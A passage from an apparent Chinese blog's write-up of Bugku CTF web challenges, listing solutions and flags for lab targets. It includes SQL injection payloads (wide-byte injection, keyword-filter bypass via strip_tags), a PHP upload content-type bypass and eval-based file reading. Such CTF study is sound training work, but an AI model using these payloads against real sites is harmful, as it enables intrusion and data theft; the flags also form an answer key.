class="number">417</span> <span class="number">418</span> <span class="number">419</span> <span class="number">421</span> <span class="number">423</span> <span class="number">425</span> <span class="number">426</span> <span class="number">427</span> <span class="number">428</span> <span class="number">433</span> <span class="number">436</span> <span class="number">442</span> <span class="number">455</span> <span class="number">469</span> <span class="number">473</span> <span class="number">476</span> <span class="number">484</span> <span class="number">485</span> <span class="number">489</span> <span class="number">495</span> <span class="number">501</span> <span class="number">504</span> <span class="number">506</span> <span class="number">507</span> <span class="number">508</span> <span class="number">510</span> <span class="number">557</span> <span class="number">558</span> <span class="number">566</span> <span class="number">594</span> <span class="number">622</span> <span class="number">632</span> <span class="number">635</span> <span class="number">642</span> <span class="number">643</span> <span class="number">652</span> <span class="number">663</span> <span class="number">672</span> <span class="number">674</span> <span class="number">675</span> <span class="number">676</span> <span class="number">683</span> <span class="number">694</span> <span class="number">739</span> <span class="number">746</span> <span class="number">756</span> <span class="number">769</span> <span class="number">771</span> <span class="number">781</span> <span class="number">783</span> <span class="number">795</span> <span class="number">801</span> <span class="number">806</span> <span class="number">807</span> <span class="number">822</span> <span class="number">827</span> <span class="number">834</span> <span class="number">836</span> <span class="number">843</span> <span class="number">849</span> <span class="number">852</span> <span class="number">859</span> <span class="number">860</span> <span class="number">872</span> <span class="number">896</span> <span class="number">900</span> <span class="number">905</span> <span class="number">924</span> <span class="number">927</span> <span class="number">932</span> <span class="number">942</span> <span class="number">948</span> <span class="number">952</span> <span class="number">965</span> <span class="number">970</span> <span class="number">976</span> <span class="number">981</span></span><br><span class="line"></span><br><span class="line">any api bkk cgf cla dsr eer eou evx exn exv eyh ezj faj hff iei ird iro iuu izl jxq kbx lbi lpo mqe mxq nhj nmf oia ouu qbd qcp qeq qfv qje qkj qtx qvg raw rre see sfv ssh tqo uau ueu ump unw upk uqy urr uyy vfj vhw vnv vqj vqk vxv vxx wek wiq xnn xoy xpp xsu xxt yiy yqv zdq zvt</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>Bugku Writeup</title>
      <link href="/180406BugkuWriteup/"/>
      <url>/180406BugkuWriteup/</url>
      
        <content type="html"><![CDATA[<h3 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h3><h4 id="WEB2"><a href="#WEB2" class="headerlink" title="WEB2"></a>WEB2</h4><blockquote><p>听说聪明的人都能找到答案<br><a href="http://120.24.86.145:8002/web2/" target="_blank" rel="noopener">http://120.24.86.145:8002/web2/</a></p></blockquote><p>源码中有注释。 <code>KEY{Web-2-bugKssNNikls9100}</code> </p><h4 id="文件上传测试"><a href="#文件上传测试" class="headerlink" title="文件上传测试"></a>文件上传测试</h4><blockquote><p><a href="http://103.238.227.13:10085/" target="_blank" rel="noopener">http://103.238.227.13:10085/</a></p><p>Flag格式：Flag:xxxxxxxxxxxxx</p></blockquote><p><code>Flag:42e97d465f962c53df9549377b513c7e</code> </p><p>上传文件后缀为PHP且修改<code>content-type</code> 值为<code>image/gif</code> 等即可。 </p><h4 id="计算题"><a href="#计算题" class="headerlink" title="计算题"></a>计算题</h4><blockquote><p>地址：<a href="http://120.24.86.145:8002/yanzhengma/" target="_blank" rel="noopener">http://120.24.86.145:8002/yanzhengma/</a></p></blockquote><p>修改前端限制。<code>flag{CTF-bugku-0032}</code> </p><h4 id="web基础-GET"><a href="#web基础-GET" class="headerlink" title="web基础$_GET"></a>web基础$_GET</h4><blockquote><p> <a href="http://120.24.86.145:8002/get/" target="_blank" rel="noopener">http://120.24.86.145:8002/get/</a></p></blockquote><p>访问<code>http://120.24.86.145:8002/get/?what=flag</code> 。<code>flag{bugku_get_su8kej2en}</code> </p><h4 id="web基础-POST"><a href="#web基础-POST" class="headerlink" title="web基础$_POST"></a>web基础$_POST</h4><blockquote><p><a href="http://120.24.86.145:8002/post/" target="_blank" rel="noopener">http://120.24.86.145:8002/post/</a></p></blockquote><p>使用hackbar post <code>what=flag</code> 。 <code>flag{bugku_get_ssseint67se}</code> </p><h4 id="你从哪里来"><a href="#你从哪里来" class="headerlink" title="你从哪里来"></a>你从哪里来</h4><blockquote><p><a href="http://120.24.86.145:9009/from.php" target="_blank" rel="noopener">http://120.24.86.145:9009/from.php</a></p></blockquote><p>添加HTTP头 <code>Referer:https://www.google.com</code> </p><p><code>flag{bug-ku_ai_admin}</code> </p><h4 id="头等舱"><a href="#头等舱" class="headerlink" title="头等舱"></a>头等舱</h4><blockquote><p><a href="http://120.24.86.145:9009/hd.php" target="_blank" rel="noopener">http://120.24.86.145:9009/hd.php</a></p></blockquote><p>响应头 <code>flag{Bugku_k8_23s_istra}:</code> ，在f12直接看看不出来。</p><h4 id="md5-collision-NUPT-CTF"><a href="#md5-collision-NUPT-CTF" class="headerlink" title="md5 collision(NUPT_CTF)"></a>md5 collision(NUPT_CTF)</h4><blockquote><p><a href="http://120.24.86.145:9009/md5.php" target="_blank" rel="noopener">http://120.24.86.145:9009/md5.php</a></p></blockquote><p><code>http://120.24.86.145:9009/md5.php?a=s878926199a</code></p><p><code>flag{md5_collision_is_easy}</code></p><h4 id="矛盾"><a href="#矛盾" class="headerlink" title="矛盾"></a>矛盾</h4><blockquote><p><a href="http://120.24.86.145:8002/get/index1.php" target="_blank" rel="noopener">http://120.24.86.145:8002/get/index1.php</a></p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$num=$_GET[<span class="string">'num'</span>];</span><br><span class="line"><span class="keyword">if</span>(!is_numeric($num))&#123;</span><br><span class="line"><span class="keyword">echo</span> $num;</span><br><span class="line"><span class="keyword">if</span>($num==<span class="number">1</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'flag&#123;**********&#125;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>http://120.24.86.145:8002/get/index1.php?num=1x</code> </p><p><code>http://120.24.86.145:8002/get/index1.php?num=1e0x</code>  </p><p><code>flag{bugku-789-ps-ssdf}</code> </p><h4 id="WEB3"><a href="#WEB3" class="headerlink" title="WEB3"></a>WEB3</h4><blockquote><p>flag就在这里快来找找吧<br><a href="http://120.24.86.145:8002/web3/" target="_blank" rel="noopener">http://120.24.86.145:8002/web3/</a></p></blockquote><p>CTRL+U;CTRL+W;CTRL+END 得到：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--&amp;#75;&amp;#69;&amp;#89;&amp;#123;&amp;#74;&amp;#50;&amp;#115;&amp;#97;&amp;#52;&amp;#50;&amp;#97;&amp;#104;&amp;#74;&amp;#75;&amp;#45;&amp;#72;&amp;#83;&amp;#49;&amp;#49;&amp;#73;&amp;#73;&amp;#73;&amp;#125;--&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">'&amp;#75;&amp;#69;&amp;#89;&amp;#123;&amp;#74;&amp;#50;&amp;#115;&amp;#97;&amp;#52;&amp;#50;&amp;#97;&amp;#104;&amp;#74;&amp;#75;&amp;#45;&amp;#72;&amp;#83;&amp;#49;&amp;#49;&amp;#73;&amp;#73;&amp;#73;&amp;#125;'</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">''</span>.join(map(<span class="keyword">lambda</span> x: chr(int(x)), s.strip(<span class="string">'&amp;#;'</span>).split(<span class="string">';&amp;#'</span>)))</span><br><span class="line"><span class="comment"># KEY&#123;J2sa42ahJK-HS11III&#125;</span></span><br></pre></td></tr></table></figure><h4 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h4><blockquote><p><a href="http://103.238.227.13:10083/" target="_blank" rel="noopener">http://103.238.227.13:10083/</a></p><p>格式KEY{}</p></blockquote><p>宽字节注入。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//103.238.227.13:10083/?id=1%dd'</span></span><br><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version <span class="keyword">for</span> the right syntax to <span class="keyword">use</span> <span class="title">near</span> ''1輁'' <span class="title">LIMIT</span> 1' <span class="title">at</span> <span class="title">line</span> 1</span><br><span class="line"></span><br><span class="line"><span class="title">http</span>://103.238.227.13:10083/?<span class="title">id</span>=1%<span class="title">dd</span>'--+</span><br><span class="line">正常返回</span><br><span class="line"></span><br><span class="line"><span class="title">http</span>://103.238.227.13:10083/?<span class="title">id</span>=1%<span class="title">dd</span>' <span class="title">order</span> <span class="title">by</span> 2--+</span><br><span class="line">确定查询列数为2</span><br><span class="line">  </span><br><span class="line"><span class="title">http</span>://103.238.227.13:10083/?<span class="title">id</span>=1%<span class="title">dd</span>' <span class="title">union</span> <span class="title">select</span> <span class="title">string</span>,0 <span class="title">from</span> `<span class="title">key</span>` <span class="title">where</span> <span class="title">id</span>=1--+</span><br><span class="line">54<span class="title">f3320dc261f313ba712eb3f13a1f6d</span></span><br></pre></td></tr></table></figure><h4 id="域名解析"><a href="#域名解析" class="headerlink" title="域名解析"></a>域名解析</h4><blockquote><p>听说把 flag.bugku.com 解析到120.24.86.145 就能拿到flag</p></blockquote><p>访问<code>120.24.86.145</code> 并burp抓包，修改host值为<code>flag.bugku.com</code> 即可。<code>KEY{DSAHDSJ82HDS2211}</code> </p><h4 id="SQL注入1"><a href="#SQL注入1" class="headerlink" title="SQL注入1"></a>SQL注入1</h4><blockquote><p>地址：<a href="http://103.238.227.13:10087/" target="_blank" rel="noopener">http://103.238.227.13:10087/</a></p><p>提示：过滤了关键字 你能绕过他吗</p><p>flag格式KEY{xxxxxxxxxxxxx}</p></blockquote><p>部分过滤代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//过滤sql</span></span><br><span class="line">$array = <span class="keyword">array</span>(<span class="string">'table'</span>,<span class="string">'union'</span>,<span class="string">'and'</span>,<span class="string">'or'</span>,<span class="string">'load_file'</span>,<span class="string">'create'</span>,<span class="string">'delete'</span>,<span class="string">'select'</span>,<span class="string">'update'</span>,<span class="string">'sleep'</span>,<span class="string">'alter'</span>,<span class="string">'drop'</span>,<span class="string">'truncate'</span>,<span class="string">'from'</span>,<span class="string">'max'</span>,<span class="string">'min'</span>,<span class="string">'order'</span>,<span class="string">'limit'</span>);</span><br><span class="line"><span class="keyword">foreach</span> ($array <span class="keyword">as</span> $value)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (substr_count($id, $value) &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">exit</span>(<span class="string">'包含敏感关键字！'</span>.$value);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//xss过滤</span></span><br><span class="line">$id = strip_tags($id);</span><br><span class="line">$query = <span class="string">"SELECT * FROM temp WHERE id=&#123;$id&#125; LIMIT 1"</span>;</span><br></pre></td></tr></table></figure><p><code>strip_tags</code> 用以从字符串中去除 HTML 和 PHP 标记，可利用其绕过sql关键字过滤。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//103.238.227.13:10087?id=1 an&lt;a&gt;d 1=2--+</span></span><br><span class="line">验证过滤思路可行</span><br><span class="line"></span><br><span class="line">http:<span class="comment">//103.238.227.13:10087?id=1 o&lt;a&gt;rder by 2--+</span></span><br><span class="line">确定查询列数为<span class="number">2</span></span><br><span class="line"></span><br><span class="line">http:<span class="comment">//103.238.227.13:10087?id=1 un&lt;a&gt;ion sel&lt;a&gt;ect 1,hash fr&lt;a&gt;om `key` where id=1--+</span></span><br><span class="line">c3d3c17b4ca7f791f85e<span class="comment">#$1cc72af274af4adef</span></span><br></pre></td></tr></table></figure><h4 id="你必须让他停下"><a href="#你必须让他停下" class="headerlink" title="你必须让他停下"></a>你必须让他停下</h4><blockquote><p>地址：<a href="http://120.24.86.145:8002/web12/" target="_blank" rel="noopener">http://120.24.86.145:8002/web12/</a></p><p>作者：@berTrAM</p></blockquote><p>在chrome  dev tool 里禁用js，然后手动刷新几次页面。页面里的图片地址不总是有效，有图片显示时(10.jpg)查看源码可见flag。或者burp抓包后重复发包几次。</p><p><code>flag{dummy_game_1s_s0_popular}</code></p><h4 id="本地包含"><a href="#本地包含" class="headerlink" title="本地包含"></a>本地包含</h4><blockquote><p>地址：<a href="http://120.24.86.145:8003/" target="_blank" rel="noopener">http://120.24.86.145:8003/</a></p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="keyword">include</span> <span class="string">"flag.php"</span>; </span><br><span class="line">    $a = @$_REQUEST[<span class="string">'hello'</span>]; </span><br><span class="line">    <span class="keyword">eval</span>( <span class="string">"var_dump($a);"</span>); </span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">  </span><br><span class="line">  ---------------------------------------------------</span><br><span class="line">view-source:http:<span class="comment">//120.24.86.145:8003/?hello=scandir('.')</span></span><br><span class="line">view-source:http:<span class="comment">//120.24.86.145:8003/?hello=file('flag.php')</span></span><br><span class="line">flag&#123;bug-ctf-gg<span class="number">-99</span>&#125;</span><br></pre></td></tr></table></figure><h4 id="变量1"><a href="#变量1" class="headerlink" title="变量1"></a>变量1</h4><blockquote><p><a href="http://120.24.86.145:8004/index1.php" target="_blank" rel="noopener">http://120.24.86.145:8004/index1.php</a></p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">flag In the variable ! <span class="meta">&lt;?php</span>  </span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag1.php"</span>;</span><br><span class="line">highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'args'</span>]))&#123;</span><br><span class="line">    $args = $_GET[<span class="string">'args'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">"/^\w+$/"</span>,$args))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"args error!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">"var_dump($$args);"</span>);</span><br><span class="line">&#125;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>我们可以读取一个可变变量的值，但不知变量的名字，考虑<a href="http://php.net/manual/zh/language.variables.superglobals.php" target="_blank" rel="noopener">超全局变量</a> 。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">view-source:http:<span class="comment">//120.24.86.145:8004/index1.php?args=GLOBALS</span></span><br><span class="line">[<span class="string">"ZFkwe3"</span>]=&gt;</span><br><span class="line">  string(<span class="number">38</span>) <span class="string">"flag&#123;92853051ab894a64f7865cf3c2128b34&#125;"</span></span><br></pre></td></tr></table></figure><h4 id="WEB5"><a href="#WEB5" class="headerlink" title="WEB5"></a>WEB5</h4><blockquote><p>JSPFUCK??????答案格式CTF{**}</p><p><a href="http://120.24.86.145:8002/web5/" target="_blank" rel="noopener">http://120.24.86.145:8002/web5/</a></p><p>字母大写</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(![]+[])[+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+!+[]]]+(+(!+[]+!+[]+!+[]+[!+[]+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]])+(+(+!+[]+[+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+[+!+[]])[+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[])[+[]]+(+(!+[]+!+[]+[+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+[+!+[]])+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+!+[]]]+([][[]]+[])[+[]]+([][[]]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]